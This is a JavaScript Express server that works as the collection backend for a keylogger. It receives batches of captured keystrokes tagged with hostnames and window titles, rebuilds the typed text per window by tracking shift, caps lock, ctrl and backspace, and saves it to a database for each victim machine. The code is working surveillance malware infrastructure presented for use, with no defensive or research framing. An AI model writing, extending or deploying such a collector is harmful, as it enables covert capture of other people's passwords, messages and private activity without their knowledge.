import express from "express";
import connectDB from "./util/database.js";
import User from "./models/User.js";
import dayjs from "dayjs";
import cors from 'cors'
import dotenv from "dotenv";

dotenv.config({});

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// allow all origins
app.use(cors());

// check backend working
app.get("/", (req, res) => {
    return res.status(200).json({
        message: "I am coming from backend",
        success: true
    });
});

const cleanTimestamp = (ts) => {
    // Remove 'India Standard Time' or any non-ISO suffix
    return ts.replace(/India Standard Time|\s*\(.*\)$/g, '').trim();
};

// save requests recieved
const processKeylogs = (hostname, rawLogs) => {
    const windowLogs = {};
    let startTime = null;
    let endTime = null;
    let ctrlDown = false;
    let shiftDown = false;
    let capsLock = false;

    rawLogs.forEach(log => {
        const { key, timestamp, window } = log;
        const currentTimestamp = new Date(cleanTimestamp(timestamp));
        if (!startTime || currentTimestamp < startTime) startTime = currentTimestamp;
        if (!endTime || currentTimestamp > endTime) endTime = currentTimestamp;
        if (!windowLogs[window]) windowLogs[window] = "";

        // Modifier key state tracking
        if (key === "[LCONTROL]") { ctrlDown = !ctrlDown; return; }
        if (key === "[LSHIFT]" || key === "[RSHIFT]") { shiftDown = !shiftDown; return; }
        if (key === "[CAPSLOCK]") { capsLock = !capsLock; return; }

        // Handle combos (e.g., ctrl+c)
        if (ctrlDown && key.length === 1) {
            windowLogs[window] += `[CTRL+${key}]`;
            ctrlDown = false; // reset after combo
            return;
        }
        if (shiftDown && key.length === 1) {
            windowLogs[window] += key.toUpperCase();
            shiftDown = false;
            return;
        }

        // Handle special keys
        if (key === "[BACKSPACE]") {
            windowLogs[window] = windowLogs[window].slice(0, -1);
            return;
        }
        const ignoredKeys = [
            "[LSHIFT]", "[RSHIFT]", "[LCONTROL]", "[CAPSLOCK]", "[LEFT]", "[RIGHT]",
            "[UP]", "[DOWN]", "[TAB]", "[ESCAPE]", "[ENTER]"
        ];
        if (ignoredKeys.includes(key)) return;
        if (key === "\n") {
            windowLogs[window] += "\n";
            return;
        }
        windowLogs[window] += capsLock ? key.toUpperCase() : key;
    });
    const logsToStore = Object.entries(windowLogs).map(([window_title, data_logged]) => ({ window_title, data_logged }));
    return {
        start: startTime,
        end: endTime,
        windows: logsToStore
    };
};

app.post("/", async (req, res) => {
    console.log(`request to save logs came by`)
    const { logs, hostname } = req.body;
    if (!Array.isArray(logs) || !hostname) {
        return res.status(400).json({ success: false, message: "Missing logs array or hostname" });
    }
    try {
        let user = await User.findOne({ hostname });
        if (!user) {
            user = new User({ hostname, Logs: [] });
        }
        const batch = processKeylogs(hostname, logs);
        user.Logs.push(batch);
        await user.save();
        res.send({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, message: "Server error" });
    }
});

// Start the server
const PORT = 8000 || process.env.PORT;
app.listen(PORT, async () => {
    try {
        await connectDB()
        console.log(`Server running at port ${PORT}`);
    } catch (err) {
        console.error('Failed to connect to database:', err);
        process.exit(1);
    }    
});